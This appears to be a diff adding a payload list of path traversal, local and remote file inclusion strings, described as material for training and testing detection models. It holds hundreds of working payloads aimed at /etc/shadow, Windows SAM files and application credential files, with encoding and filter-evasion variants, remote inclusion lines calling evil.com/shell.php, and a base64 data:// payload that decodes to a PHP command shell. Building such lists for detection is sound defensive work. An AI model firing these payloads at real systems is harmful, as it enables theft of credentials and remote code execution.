@@ -1,0 +1,342 @@
+# Path Traversal Attack Patterns
+# These patterns can be used for training and testing path traversal detection models
+
+# Basic Path Traversal
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
+../../../../../../../../../
+../../../../../../../../../../
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/exe
+/etc/issue
+/etc/motd
+/etc/mysql/my.cnf
+/etc/httpd/conf/httpd.conf
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+
+# Windows Path Traversal
+..\
+..\..\
+..\..\..\
+..\..\..\..\
+..\..\..\..\..\
+..\..\..\..\..\..\
+..\..\..\..\..\..\..\
+..\..\..\..\..\..\..\..\
+..\..\..\..\..\..\..\..\..\
+..\..\..\..\..\..\..\..\..\..\
+C:\Windows\win.ini
+C:\boot.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\system.ini
+C:\Windows\repair\sam
+C:\Windows\repair\system
+C:\Windows\repair\software
+C:\Windows\repair\security
+C:\Windows\debug\NetSetup.log
+C:\WINNT\system32\config\AppEvent.Evt
+
+# URL-encoded Path Traversal
+%2e%2e%2f
+%2e%2e/
+..%2f
+%2e%2e%5c
+%2e%2e\
+..%5c
+%252e%252e%255c
+..%255c
+..%c0%af
+..%c1%9c
+%25%32%65%25%32%65%25%32%66
+..%c0%9v
+%c0%ae%c0%ae%c0%ae%c0%af
+%c0%ae%c0%ae%c0%ae%c0%5c
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+
+# Double URL-encoded Path Traversal
+%252e%252e%252f
+%252e%252e%25252e%25252e%25252f
+%25252e%25252e%25255c
+
+# OS-specific Path Traversal
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+..\Windows\win.ini
+..\..\Windows\win.ini
+..\..\..\Windows\win.ini
+..\..\..\..\Windows\win.ini
+..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\..\Windows\win.ini
+..\..\..\..\..\..\..\..\..\..\Windows\win.ini
+
+# Combined with null byte
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.png
+../../../etc/passwd%00.gif
+../../../etc/passwd%00.html
+../../..%00/etc/passwd
+
+# Path Traversal with filter evasion
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+..../\..../\..../\etc/passwd
+....\\....\\....\\etc/passwd
+..././..././..././etc/passwd
+..//...//..//...//etc/passwd
+.././.././.././etc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+%25%5c..%25%5c..%25%5c..%25%5cetc/passwd
+..%25%5c..%25%5c..%25%5cetc/passwd
+..%c1%9c..%c1%9c..%c1%9cetc/passwd
+
+# Exotic Path Traversal
+/./././././././././././etc/passwd
+/..;/..;/..;/etc/passwd
+../\../\../\../\etc/passwd
+\..\..\..\..\windows\win.ini
+;/../../../../../../../../etc/passwd
+
+# Path Traversal targeting web files
+../webapp/WEB-INF/web.xml
+../../../WEB-INF/web.xml
+../../../../WEB-INF/web.xml
+../../../../../WEB-INF/web.xml
+../../../../../../WEB-INF/web.xml
+../../../../../../../WEB-INF/web.xml
+../../../../../../../../WEB-INF/web.xml
+../../../../../../../../../WEB-INF/web.xml
+../../../../../../../../../../WEB-INF/web.xml
+../app/META-INF/context.xml
+../../META-INF/context.xml
+../../../META-INF/context.xml
+../../../../META-INF/context.xml
+../../../../../META-INF/context.xml
+../../../../../../META-INF/context.xml
+../../../../../../../META-INF/context.xml
+../../../../../../../../META-INF/context.xml
+../../../../../../../../../META-INF/context.xml
+../../../../../../../../../../META-INF/context.xml
+
+# Advanced encoding techniques
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
+%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%u2216..%u2216..%u2216etc/passwd
+
+# Path Traversal with special characters
+../!/../!/../!/etc/passwd
+..\/..\/..\/etc/passwd
+../&#46;/..&#46;/../&#46;/etc/passwd
+..%5c..%5c..%5cetc%5cpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%252e%252e/%252e%252e/%252e%252e/etc/passwd
+..0x2f..0x2f..0x2f..0x2fetc/passwd
+..0x5c..0x5c..0x5c..0x5cetc/passwd
+
+# Path Traversal targeting configuration files
+../../../app/config.php
+../../../config/database.yml
+../../../config/database.php
+../../../app/config/parameters.yml
+../../../../wp-config.php
+../../../conf/server.xml
+../../../.env
+../../../config.json
+../../../application.properties
+../../../settings.py
+../../../appsettings.json
+../../../credentials.xml
+
+# Path Traversal targeting log files
+../../../log/apache/access.log
+../../../log/apache/error.log
+../../../log/nginx/access.log
+../../../log/nginx/error.log
+../../../var/log/apache2/access.log
+../../../var/log/apache2/error.log
+../../../var/log/nginx/access.log
+../../../var/log/nginx/error.log
+../../../var/log/httpd/access_log
+../../../var/log/httpd/error_log
+../../../var/log/apache/access.log
+../../../var/log/apache/error.log
+../../../usr/local/apache/log/error_log
+../../../usr/local/apache2/log/error_log
+
+# Path Traversal with normalization
+.//..//..//..//etc/passwd
+..\\..\\..\\\windows\\win.ini
+.../.../...///etc/passwd
+.%2e\.%2e\.%2e\\windows\win.ini
+.%2e/.%2e/.%2e///etc/passwd
+
+# Path Traversal with whitespace manipulation
+..%09/..%09/..%09/etc/passwd
+..%09\..%09\..%09\windows\win.ini
+..%20/..%20/..%20/etc/passwd
+..%20\..%20\..%20\windows\win.ini
+..%0d/..%0d/..%0d/etc/passwd
+..%0d\..%0d\..%0d\windows\win.ini
+..%0a/..%0a/..%0a/etc/passwd
+..%0a\..%0a\..%0a\windows\win.ini
+
+# Path Traversal with mixed path separators
+../\../\../\etc/passwd
+..\/..\/..\/ etc/passwd
+
+# Path Traversal in LFI scenarios
+?file=../../../etc/passwd
+?page=../../../etc/passwd
+?path=../../../etc/passwd
+?include=../../../etc/passwd
+?document=../../../etc/passwd
+?folder=../../../etc/passwd
+?root=../../../etc/passwd
+?dir=../../../etc/passwd
+
+# Path Traversal for Remote File Inclusion (RFI)
+?file=http://evil.com/shell.php
+?include=http://evil.com/shell.php
+?page=http://evil.com/shell.php
+?file=ftp://evil.com/shell.php
+
+# Path Traversal with file extension bypass
+../../../etc/passwd%00.png
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.pdf
+../../../etc/passwd%00.gif
+../../../etc/passwd?.jpg
+../../../etc/passwd#.jpg
+
+# Path Traversal with protocol wrappers
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://filter/read=convert.base64-encode/resource=../../../etc/passwd
+zip://shell.jpg%23payload.php
+file:///etc/passwd
+file://localhost/etc/passwd
+file:///c:/windows/win.ini
+file://localhost/c:/windows/win.ini
+
+# Path Traversal with wrappers and filters (PHP specific)
+php://filter/read=convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../includes/config.inc.php
+php://filter/convert.base64-decode/resource=../includes/config.inc.php
+zip://uploads/avatar.zip#../../../etc/passwd
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+expect://ls
+
+# Path Traversal with specific targets
+../../../lib/session/session.php
+../../../includes/functions.php
+../../../includes/config.php
+../../../includes/db.php
+../../../includes/db_connect.php
+../../../includes/database.php
+../../../includes/db_connection.php
+../../../conf/config.ini
+../../../app/config/config.yml
+../../../app/config/parameters.yml
+../../../config/app.php
+../../../config/database.php
+../../../wp-config.php
+../../../configuration.php
+../../../sites/default/settings.php
+../../../config.inc.php
+../../../inc/config.php
+../../../application/config/database.php
+../../../application/config/config.php
+../../../system/config/default.php
+
+# Path Traversal targeting multiple platforms simultaneously
+..%5c..%5c..%5cetc%5cpasswd
+..%2f..%2f..%2fetc%2fpasswd
+..\../..\../Windows/win.ini
+../\../\../\etc/passwd
+..\\/.\\/windows\\win.ini
+
+# Path Traversal bypassing path normalization
+..///////..///////..///////..///////etc/passwd
+..\\\\\\\\..\\\\\\\\..\\\\\\\\windows\\\\win.ini
+../../.././././././././etc/passwd
+../../../../../../../../../../../../etc/passwd/./././././.
+../../../../../../../../../../../../windows\\.\\.\\.\\.\\win.ini
+
+# Path Traversal with case manipulation
+../.././../EtC/PassWd
+../.././../eTc/pAsSwD
+..\..\..\WiNdOwS\WiN.InI
+..\..\..\wInDoWs\wIn.InI
+
+# Path Traversal with unicode normalization
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+..%ef%bc%8f../..%ef%bc%8f../etc%ef%bc%8fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+
+# Path Traversal with path truncation
+../../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../Windows/win.ini
+
+# Path Traversal with payload at path component boundaries
+/pathA/../pathB/../pathC/../../../etc/passwd
+/aaa/..;/bbb/..;/ccc/..;/etc/passwd
+/first;/../second;/../third;/../../../../etc/passwd
+
+# Advanced path tricks
+../../../etc/passwd/.
+../../etc/passwd/..
+../../../etc/passwd/./
+../../../etc/passwd/../
+
+# Path Traversal with specific file extensions (vulnerable PHP applications)
+../../../index.php
+../../../admin.php
+../../../login.php
+../../../upload.php
+../../../download.php
+../../../file.php
+../../../process.php
+../../../config.php
+../../../settings.php
+../../../functions.php
+../../../includes.php
+../../../common.php
+../../../global.php
+../../../database.php
+../../../db.php
+../../../connect.php
+../../../connection.php
+../../../class.php
+../../../classes.php
+../../../utils.php
+../../../utilities.php
+../../../helper.php
+../../../helpers.php
+../../../api.php
+../../../ajax.php 
